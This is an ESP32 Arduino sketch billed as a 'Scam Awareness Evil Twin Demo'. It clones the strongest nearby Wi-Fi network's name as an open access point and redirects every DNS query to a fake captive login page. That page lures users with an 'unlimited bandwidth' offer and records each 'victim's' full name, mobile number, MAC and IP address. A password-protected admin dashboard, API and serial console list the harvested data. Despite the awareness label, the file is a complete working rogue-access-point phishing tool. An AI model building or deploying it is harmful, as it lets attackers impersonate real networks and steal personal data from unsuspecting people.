#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <esp_wifi.h>
#include <vector>

// Configuration
#define ADMIN_USER "admin"
#define ADMIN_PASS "scamaware"
#define DNS_PORT 53
#define CAPTIVE_PORTAL_PORT 80

// Global variables
WebServer server(CAPTIVE_PORTAL_PORT);
DNSServer dnsServer;
std::vector<String> scannedSSIDs;
String clonedSSID = "";
String clonedPassword = "";
int clonedChannel = 1;
int deviceCount = 0;

struct Victim {
  String name;
  String mobile;
  String mac;
  String ip;
  String timestamp;
};
std::vector<Victim> victims;

struct ConnectedDevice {
  String mac;
  String ip;
  int rssi;
};
std::vector<ConnectedDevice> connectedDevices;

void setup() {
  Serial.begin(115200);
  delay(1000);
  
  Serial.println("\nScam Awareness Evil Twin Demo");
  Serial.println("----------------------------");
  
  // Start WiFi in STA mode to scan networks
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  
  scanNetworks();
  selectNetworkToClone();
  setupEvilTwin();
  setupWebServer();
  
  Serial.println("\nEvil Twin Running. Commands:");
  Serial.println("list - Show scanned networks");
  Serial.println("clone [SSID] - Clone specific network");
  Serial.println("victims - List collected data");
  Serial.println("devices - List currently connected devices");
  Serial.println("restart - Restart the device");
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
  handleSerialCommands();
  
  // Update connected devices periodically
  static unsigned long lastUpdate = 0;
  if (millis() - lastUpdate > 5000) {
    updateConnectedDevices();
    lastUpdate = millis();
  }
}

// WiFi Scanning Functions
void scanNetworks() {
  Serial.println("Scanning WiFi networks...");
  int n = WiFi.scanNetworks();
  
  scannedSSIDs.clear();
  
  if (n == 0) {
    Serial.println("No networks found");
  } else {
    Serial.printf("%-4s %-20s %-5s %-12s %s\n", "#", "SSID", "CH", "RSSI", "Auth");
    for (int i = 0; i < n; ++i) {
      String ssid = WiFi.SSID(i);
      int channel = WiFi.channel(i);
      int rssi = WiFi.RSSI(i);
      String auth = (WiFi.encryptionType(i) == WIFI_AUTH_OPEN) ? "Open" : "Secured";
      
      Serial.printf("%-4d %-20s %-5d %-12d %s\n", i+1, ssid.c_str(), channel, rssi, auth.c_str());
      scannedSSIDs.push_back(ssid);
    }
  }
}

void selectNetworkToClone() {
  if (scannedSSIDs.empty()) {
    Serial.println("No networks available to clone");
    return;
  }
  
  // Default: clone the network with highest RSSI
  int bestIndex = 0;
  int bestRSSI = -1000;
  
  for (int i = 0; i < WiFi.scanNetworks(); i++) {
    if (WiFi.RSSI(i) > bestRSSI) {
      bestRSSI = WiFi.RSSI(i);
      bestIndex = i;
    }
  }
  
  clonedSSID = WiFi.SSID(bestIndex);
  clonedChannel = WiFi.channel(bestIndex);
  
  Serial.println("\nAutomatically selected strongest network to clone:");
  Serial.println("SSID: " + clonedSSID);
  Serial.println("Channel: " + String(clonedChannel));
}

// Evil Twin Setup
void setupEvilTwin() {
  WiFi.mode(WIFI_AP);
  WiFi.softAP(clonedSSID.c_str());
  
  // Set same channel as original network
  esp_wifi_set_channel(clonedChannel, WIFI_SECOND_CHAN_NONE);
  
  Serial.println("\nEvil Twin AP Started:");
  Serial.println("SSID: " + clonedSSID);
  Serial.println("IP: " + WiFi.softAPIP().toString());
  
  // DNS server for captive portal
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
}

// Web Server Setup
void setupWebServer() {
  // Login page
  server.on("/", HTTP_GET, []() {
    server.sendHeader("Location", "/login");
    server.send(302);
  });
  
  server.on("/login", HTTP_GET, []() {
    String html = loginPage();
    server.send(200, "text/html", html);
  });
  
  server.on("/login", HTTP_POST, []() {
    String name = server.arg("name");
    String mobile = server.arg("mobile");
    
    // Get client info
    String clientIP = server.client().remoteIP().toString();
    String clientMAC = getClientMac(server.client().remoteIP());
    
    // Save victim data
    Victim v;
    v.name = name;
    v.mobile = mobile;
    v.ip = clientIP;
    v.mac = clientMAC;
    v.timestamp = getTimeStamp();
    victims.push_back(v);
    deviceCount++;
    
    // Redirect to "success" page
    String html = successPage();
    server.send(200, "text/html", html);
  });
  
  // Admin page
  server.on("/admin", HTTP_GET, []() {
    if (!server.authenticate(ADMIN_USER, ADMIN_PASS)) {
      return server.requestAuthentication();
    }
    String html = adminPage();
    server.send(200, "text/html", html);
  });
  
  // API to get victims data
  server.on("/api/victims", HTTP_GET, []() {
    if (!server.authenticate(ADMIN_USER, ADMIN_PASS)) {
      return server.requestAuthentication();
    }
    
    String json = "[";
    for (size_t i = 0; i < victims.size(); i++) {
      if (i != 0) json += ",";
      json += "{";
      json += "\"name\":\"" + victims[i].name + "\",";
      json += "\"mobile\":\"" + victims[i].mobile + "\",";
      json += "\"mac\":\"" + victims[i].mac + "\",";
      json += "\"ip\":\"" + victims[i].ip + "\",";
      json += "\"timestamp\":\"" + victims[i].timestamp + "\"";
      json += "}";
    }
    json += "]";
    
    server.send(200, "application/json", json);
  });
  
  // API to get connected devices
  server.on("/api/devices", HTTP_GET, []() {
    if (!server.authenticate(ADMIN_USER, ADMIN_PASS)) {
      return server.requestAuthentication();
    }
    
    String json = "[";
    for (size_t i = 0; i < connectedDevices.size(); i++) {
      if (i != 0) json += ",";
      json += "{";
      json += "\"mac\":\"" + connectedDevices[i].mac + "\",";
      json += "\"ip\":\"" + connectedDevices[i].ip + "\",";
      json += "\"rssi\":\"" + String(connectedDevices[i].rssi) + "\"";
      json += "}";
    }
    json += "]";
    
    server.send(200, "application/json", json);
  });
  
  // Handle 404
  server.onNotFound([]() {
    server.sendHeader("Location", "/login");
    server.send(302);
  });
  
  server.begin();
}

// HTML Pages
String loginPage() {
  String page = R"(
  <!DOCTYPE html>
  <html>
  <head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Login</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        background-color: #f5f5f5;
        margin: 0;
        padding: 0;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
      }
      .login-container {
        background-color: white;
        border-radius: 8px;
        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
        padding: 30px;
        width: 90%;
        max-width: 400px;
      }
      h1 {
        color: #333;
        text-align: center;
        margin-bottom: 24px;
        font-size: 24px;
      }
      .form-group {
        margin-bottom: 20px;
      }
      label {
        display: block;
        margin-bottom: 8px;
        color: #555;
        font-weight: bold;
      }
      input {
        width: 100%;
        padding: 10px;
        border: 1px solid #ddd;
        border-radius: 4px;
        box-sizing: border-box;
        font-size: 16px;
      }
      button {
        width: 100%;
        padding: 12px;
        background-color: #4CAF50;
        color: white;
        border: none;
        border-radius: 4px;
        cursor: pointer;
        font-size: 16px;
        font-weight: bold;
      }
      button:hover {
        background-color: #45a049;
      }
      .promo {
        background-color: #e8f5e9;
        padding: 15px;
        border-radius: 4px;
        margin-bottom: 20px;
        text-align: center;
      }
      .promo h3 {
        margin-top: 0;
        color: #2e7d32;
      }
    </style>
  </head>
  <body>
    <div class="login-container">
      <h1>Connect to )" + clonedSSID + R"(</h1>
      
      <div class="promo">
        <h3>Unlimited Bandwidth Offer!</h3>
        <p>Login now to enjoy high-speed unlimited internet access for 30 days!</p>
      </div>
      
      <form action="/login" method="POST">
        <div class="form-group">
          <label for="name">Full Name</label>
          <input type="text" id="name" name="name" required>
        </div>
        
        <div class="form-group">
          <label for="mobile">Mobile Number</label>
          <input type="tel" id="mobile" name="mobile" required>
        </div>
        
        <button type="submit">Connect to WiFi</button>
      </form>
    </div>
  </body>
  </html>
  )";
  return page;
}

String successPage() {
  String page = R"(
  <!DOCTYPE html>
  <html>
  <head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome!</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        background-color: #f5f5f5;
        margin: 0;
        padding: 0;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
      }
      .container {
        background-color: white;
        border-radius: 8px;
        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
        padding: 30px;
        width: 90%;
        max-width: 400px;
        text-align: center;
      }
      h1 {
        color: #4CAF50;
        margin-bottom: 20px;
      }
      p {
        color: #555;
        margin-bottom: 30px;
      }
      .icon {
        font-size: 48px;
        color: #4CAF50;
        margin-bottom: 20px;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="icon">✓</div>
      <h1>Welcome to )" + clonedSSID + R"(</h1>
      <p>You are now connected to our premium WiFi network with unlimited bandwidth!</p>
      <p>Enjoy your browsing experience.</p>
    </div>
  </body>
  </html>
  )";
  return page;
}

String adminPage() {
  String page = R"(
  <!DOCTYPE html>
  <html>
  <head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        margin: 0;
        padding: 0;
        background-color: #f4f4f9;
      }
      .header {
        background-color: #333;
        color: white;
        padding: 15px 20px;
        display: flex;
        justify-content: space-between;
        align-items: center;
      }
      .container {
        padding: 20px;
      }
      .stats {
        display: flex;
        flex-wrap: wrap;
        gap: 20px;
        margin-bottom: 30px;
      }
      .stat-card {
        background-color: white;
        border-radius: 5px;
        box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        padding: 20px;
        flex: 1;
        min-width: 200px;
      }
      .stat-card h3 {
        margin-top: 0;
        color: #555;
      }
      .stat-card p {
        font-size: 24px;
        font-weight: bold;
        margin: 10px 0 0;
        color: #333;
      }
      table {
        width: 100%;
        border-collapse: collapse;
        background-color: white;
        box-shadow: 0 2px 5px rgba(0,0,0,0.1);
      }
      th, td {
        padding: 12px 15px;
        text-align: left;
        border-bottom: 1px solid #ddd;
      }
      th {
        background-color: #f8f8f8;
        font-weight: bold;
      }
      tr:hover {
        background-color: #f5f5f5;
      }
      .tab {
        overflow: hidden;
        border: 1px solid #ccc;
        background-color: #f1f1f1;
        margin-bottom: 20px;
      }
      .tab button {
        background-color: inherit;
        float: left;
        border: none;
        outline: none;
        cursor: pointer;
        padding: 14px 16px;
        transition: 0.3s;
      }
      .tab button:hover {
        background-color: #ddd;
      }
      .tab button.active {
        background-color: #ccc;
      }
      .tabcontent {
        display: none;
        padding: 6px 12px;
        border: 1px solid #ccc;
        border-top: none;
      }
      @media (max-width: 768px) {
        .stats {
          flex-direction: column;
        }
        table {
          display: block;
          overflow-x: auto;
        }
      }
    </style>
  </head>
  <body>
    <div class="header">
      <h1>Admin Dashboard</h1>
      <span>Connected to: )" + clonedSSID + R"(</span>
    </div>
    
    <div class="container">
      <div class="stats">
        <div class="stat-card">
          <h3>Total Victims</h3>
          <p>)" + String(victims.size()) + R"(</p>
        </div>
        <div class="stat-card">
          <h3>Connected Now</h3>
          <p>)" + String(connectedDevices.size()) + R"(</p>
        </div>
        <div class="stat-card">
          <h3>AP IP</h3>
          <p>)" + WiFi.softAPIP().toString() + R"(</p>
        </div>
      </div>
      
      <div class="tab">
        <button class="tablinks active" onclick="openTab(event, 'victims')">Victims</button>
        <button class="tablinks" onclick="openTab(event, 'devices')">Connected Devices</button>
      </div>
      
      <div id="victims" class="tabcontent" style="display:block">
        <h2>Victim Data</h2>
        <table>
          <thead>
            <tr>
              <th>Name</th>
              <th>Mobile</th>
              <th>MAC Address</th>
              <th>IP Address</th>
              <th>Timestamp</th>
            </tr>
          </thead>
          <tbody id="victimsData">
          </tbody>
        </table>
      </div>
      
      <div id="devices" class="tabcontent">
        <h2>Currently Connected Devices</h2>
        <table>
          <thead>
            <tr>
              <th>MAC Address</th>
              <th>IP Address</th>
              <th>Signal Strength</th>
            </tr>
          </thead>
          <tbody id="devicesData">
          </tbody>
        </table>
      </div>
    </div>
    
    <script>
      function openTab(evt, tabName) {
        var i, tabcontent, tablinks;
        tabcontent = document.getElementsByClassName("tabcontent");
        for (i = 0; i < tabcontent.length; i++) {
          tabcontent[i].style.display = "none";
        }
        tablinks = document.getElementsByClassName("tablinks");
        for (i = 0; i < tablinks.length; i++) {
          tablinks[i].className = tablinks[i].className.replace(" active", "");
        }
        document.getElementById(tabName).style.display = "block";
        evt.currentTarget.className += " active";
      }
      
      function loadVictims() {
        fetch('/api/victims')
          .then(response => response.json())
          .then(data => {
            const tbody = document.getElementById('victimsData');
            tbody.innerHTML = '';
            
            data.forEach(victim => {
              const row = document.createElement('tr');
              row.innerHTML = `
                <td>${victim.name || '-'}</td>
                <td>${victim.mobile || '-'}</td>
                <td>${victim.mac}</td>
                <td>${victim.ip}</td>
                <td>${victim.timestamp}</td>
              `;
              tbody.appendChild(row);
            });
          });
      }
      
      function loadDevices() {
        fetch('/api/devices')
          .then(response => response.json())
          .then(data => {
            const tbody = document.getElementById('devicesData');
            tbody.innerHTML = '';
            
            data.forEach(device => {
              const row = document.createElement('tr');
              row.innerHTML = `
                <td>${device.mac}</td>
                <td>${device.ip}</td>
                <td>${device.rssi} dBm</td>
              `;
              tbody.appendChild(row);
            });
          });
      }
      
      // Load data on page load
      document.addEventListener('DOMContentLoaded', function() {
        loadVictims();
        loadDevices();
      });
      
      // Refresh data every 5 seconds
      setInterval(function() {
        if (document.getElementById('victims').style.display === 'block') {
          loadVictims();
        } else {
          loadDevices();
        }
      }, 5000);
    </script>
  </body>
  </html>
  )";
  return page;
}

// Utility Functions
String macToString(const uint8_t* mac) {
  char macStr[18];
  snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(macStr);
}

String getClientMac(IPAddress ip) {
  wifi_sta_list_t sta_list;
  tcpip_adapter_sta_list_t adapter_sta_list;
  
  if (esp_wifi_ap_get_sta_list(&sta_list) != ESP_OK) {
    return "Unknown";
  }
  
  if (tcpip_adapter_get_sta_list(&sta_list, &adapter_sta_list) != ESP_OK) {
    return "Unknown";
  }
  
  for (int i = 0; i < adapter_sta_list.num; i++) {
    tcpip_adapter_sta_info_t station = adapter_sta_list.sta[i];
    if (station.ip.addr == ip) {
      return macToString(station.mac);
    }
  }
  
  return "Unknown";
}

String getTimeStamp() {
  // Simple timestamp for demo purposes
  unsigned long seconds = millis() / 1000;
  int hh = (seconds / 3600) % 24;
  int mm = (seconds / 60) % 60;
  int ss = seconds % 60;
  
  char timestamp[20];
  snprintf(timestamp, sizeof(timestamp), "%02d:%02d:%02d", hh, mm, ss);
  return String(timestamp);
}

void updateConnectedDevices() {
  connectedDevices.clear();
  
  wifi_sta_list_t sta_list;
  tcpip_adapter_sta_list_t adapter_sta_list;
  
  if (esp_wifi_ap_get_sta_list(&sta_list) == ESP_OK && 
      tcpip_adapter_get_sta_list(&sta_list, &adapter_sta_list) == ESP_OK) {
    for (int i = 0; i < adapter_sta_list.num; i++) {
      tcpip_adapter_sta_info_t station = adapter_sta_list.sta[i];
      
      ConnectedDevice device;
      device.mac = macToString(station.mac);
      device.ip = IPAddress(station.ip.addr).toString();
      device.rssi = sta_list.sta[i].rssi;
      
      connectedDevices.push_back(device);
    }
  }
}

// Serial Command Handling
void handleSerialCommands() {
  if (Serial.available()) {
    String command = Serial.readStringUntil('\n');
    command.trim();
    
    if (command == "list") {
      Serial.println("\nScanned Networks:");
      for (size_t i = 0; i < scannedSSIDs.size(); i++) {
        Serial.printf("%2d: %s\n", i+1, scannedSSIDs[i].c_str());
      }
    }
    else if (command.startsWith("clone ")) {
      String ssid = command.substring(6);
      if (ssid.length() > 0) {
        clonedSSID = ssid;
        Serial.println("Cloning network: " + clonedSSID);
        setupEvilTwin();
      } else {
        Serial.println("Please specify an SSID to clone");
      }
    }
    else if (command == "victims") {
      Serial.println("\nCollected Victim Data:");
      Serial.println("------------------------------------------------------------");
      Serial.printf("%-20s %-15s %-17s %-15s %s\n", 
                   "Name", "Mobile", "MAC Address", "IP Address", "Timestamp");
      Serial.println("------------------------------------------------------------");
      
      for (const auto& victim : victims) {
        Serial.printf("%-20s %-15s %-17s %-15s %s\n", 
                     victim.name.c_str(), victim.mobile.c_str(), 
                     victim.mac.c_str(), victim.ip.c_str(), 
                     victim.timestamp.c_str());
      }
    }
    else if (command == "devices") {
      updateConnectedDevices();
      Serial.println("\nCurrently Connected Devices:");
      Serial.println("--------------------------------------------");
      Serial.printf("%-17s %-15s %s\n", "MAC Address", "IP Address", "RSSI");
      Serial.println("--------------------------------------------");
      
      for (const auto& device : connectedDevices) {
        Serial.printf("%-17s %-15s %d dBm\n", 
                     device.mac.c_str(), device.ip.c_str(), device.rssi);
      }
    }
    else if (command == "restart") {
      Serial.println("Restarting...");
      ESP.restart();
    }
    else {
      Serial.println("Unknown command. Available commands:");
      Serial.println("list - Show scanned networks");
      Serial.println("clone [SSID] - Clone specific network");
      Serial.println("victims - List collected data");
      Serial.println("devices - List currently connected devices");
      Serial.println("restart - Restart the device");
    }
  }
}